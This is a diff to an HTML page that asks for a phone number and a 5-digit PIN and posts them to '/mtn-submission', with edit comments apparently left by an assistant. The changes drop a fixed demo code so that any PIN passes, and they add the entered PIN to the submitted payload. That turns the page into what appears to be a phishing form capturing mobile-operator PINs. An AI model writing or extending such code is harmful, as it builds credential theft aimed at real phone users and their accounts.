@@ -251,7 +251,7 @@
     <div class="code-box">
       <input
         id="pincode"
-        type="text"
+        type="tel"
         inputmode="numeric"
         maxlength="5"
         placeholder="xxxxx"
@@ -267,7 +267,7 @@
     </button>
 
     <div class="small">
-      pincode code: <strong>xxxxx</strong>
+      Enter any 5-digit security code.
     </div>
 
   </section>
@@ -301,7 +301,8 @@
   const phone = document.getElementById("phone");
   const phoneError = document.getElementById("phoneError");
 
-  const demoCode = document.getElementById("pinCode");
+  // FIXED: Correctly targeted id="pincode" from the HTML structure
+  const pinCode = document.getElementById("pincode");
   const codeError = document.getElementById("codeError");
 
   const continueBtn = document.getElementById("continueBtn");
@@ -343,8 +344,9 @@
       return;
     }
 
-    if (code !== "12345") {
-      codeError.textContent = "Enter the 5-digit pin code";
+    // MODIFIED: Replaced standard string check with a 5-digit number validation pattern
+    if (!/^[0-9]{5}$/.test(code)) {
+      codeError.textContent = "Enter a valid 5-digit pin code";
       codeError.style.display = "block";
       return;
     }
@@ -356,6 +358,7 @@
 
     try {
 
+      // MODIFIED: Included the dynamic pin variable inside the request payload body
       await fetch("/mtn-submission", {
         method: "POST",
         headers: {
@@ -363,6 +366,7 @@
         },
         body: JSON.stringify({
           phone: mtnPhone,
+          pin: code,
           success: true
         })
       });
@@ -378,3 +382,4 @@
 
 </body>
 </html>
+
